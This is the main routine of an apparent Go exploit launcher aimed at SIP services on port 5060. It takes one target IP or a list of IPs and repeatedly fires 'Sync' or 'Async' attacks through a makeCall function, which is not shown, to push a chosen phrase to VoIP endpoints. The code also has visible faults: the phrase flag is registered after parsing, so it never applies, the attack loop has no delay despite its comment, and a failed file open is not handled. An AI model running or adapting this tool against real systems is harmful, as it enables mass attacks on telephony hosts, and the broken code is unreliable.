package main

import (
	"bufio"
	"flag"
	"log"
	"os"
	"regexp"
)

func printChannelData(ch chan string, debug bool) {
	if debug {
		log.Println(<-ch)
	} else {
		<-ch
	}
}

func main() {
	sport := "5060"
	isFile := false

	target := flag.String(
		"t",
		"localhost",
		"Target url or target file to attack ",
	)
	debug := flag.Bool(
		"d",
		true,
		"Flag to enable, disable logs")
	flag.Parse()

	phrase := flag.String(
		"s",
		"[YOUR PHRASE IS HERE]",
		"Your phrase to be shown")

	var ips []string
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	if match, _ := regexp.MatchString(ipv4Regex, *target); !match {
		isFile = true
		//trying to open file, otherwise mentioning how to launch the CVE
		file, err := os.Open(*target)
		if err != nil {
			log.Println("\n\033[31m Specify target like '-t <target_ip>' or '-t <target_filename>'")
			log.Println("\033[34m" + err.Error())
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)

		for scanner.Scan() {
			ips = append(ips, scanner.Text())
		}
	}

	// attack target(s) every 3 minutes until docker or instance is alive.
	for {
		//checking if the parameter is URL or not
		if !isFile {
			log.Println("\n\033[34m[+] The target is in URL. Starting Sync Attack...")
			ch := make(chan string)
			go printChannelData(ch, *debug)
			go makeCall(*target, sport, *phrase, ch)
			os.Exit(0)
		} else {
			log.Println("\n\u001B[34m[+] The target is in file. Starting Async Attack...")
			for _, ip := range ips {
				ch := make(chan string)
				go printChannelData(ch, *debug)
				go makeCall(ip, sport, *phrase, ch)
			}
		}
		log.Println("\n\033[33m NEXT CIRCLE!")
	}

}
